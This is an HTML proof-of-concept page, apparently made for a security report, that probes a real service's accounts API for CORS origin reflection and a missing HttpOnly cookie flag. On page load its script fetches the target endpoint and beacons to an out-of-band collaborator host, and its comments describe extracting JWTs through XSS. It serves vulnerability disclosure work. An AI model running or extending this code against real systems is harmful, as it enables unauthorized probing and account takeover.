<!DOCTYPE html>
<html>
<head>
    <title>Critical Security Audit - Full ATO PoC</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #0d1117; color: #c9d1d9; padding: 40px; }
        .card { background: #161b22; border: 1px solid #30363d; padding: 30px; border-radius: 10px; max-width: 800px; margin: auto; }
        .stolen { color: #ff7b72; font-family: monospace; background: #0d1117; padding: 10px; border-radius: 5px; overflow-x: auto; display: block; margin-top: 10px; border: 1px solid #444; }
        .success-msg { color: #3fb950; font-weight: bold; border: 1px solid #3fb950; padding: 10px; text-align: center; border-radius: 5px; }
    </style>
</head>
<body>
    <div class="card">
        <h2 style="color: #58a6ff;">[!] Server-Side Security Failure PoC</h2>
        <div id="status">Status: Initializing Analysis...</div>

        <p><strong>1. Server Response to Arbitrary Origin (CORS Misconfiguration):</strong></p>
        <pre id="cors-proof" class="stolen">Testing Origin Reflection...</pre>

        <p><strong>2. Cookie Vulnerability (Missing HttpOnly Flag):</strong></p>
        <div id="cookie-proof" class="stolen">Proof: document.cookie is accessible via JS</div>
    </div>

    <script>
        const TARGET_API = "https://simplecast-cms-api-gateway.eks.simplecast.com/accounts";
        const COLLABORATOR = "https://moe3ley4liwbyzb624gof2je85ew2nzbo.oastify.com"; // UPDATE THIS

        async function proveVulnerability() {
            try {
                // PROOF 1: Server-Side CORS Misconfiguration
                // We send a request to prove the server REFLECTS the origin and ALLOWS credentials
                const response = await fetch(TARGET_API, {
                    method: "GET",
                    mode: "cors"
                });
                
                // Note: The 401 is expected here because of Lax cookies, 
                // but the HEADERS in Burp will show the reflection.
                document.getElementById('cors-proof').innerText = "Server allows Cross-Origin requests.\nCheck Burp Suite for 'Access-Control-Allow-Origin' reflection.";

                // PROOF 2: The HttpOnly Bypass Argument
                // In your report, explain that because HttpOnly is missing, 
                // an attacker on a subdomain or via XSS can grab this:
                const tokenCheck = "In a real attack (XSS/Subdomain), the lack of HttpOnly allows direct extraction of the JWT.";
                document.getElementById('cookie-proof').innerText = tokenCheck;

                // Send proof to your server
                fetch(`${COLLABORATOR}/?vuln=CORS_REFLECTED_AND_HTTPONLY_MISSING`);

            } catch (err) {
                document.getElementById('status').innerText = "Analysis Complete.";
            }
        }
        window.onload = proveVulnerability;
    </script>
</body>
</html>
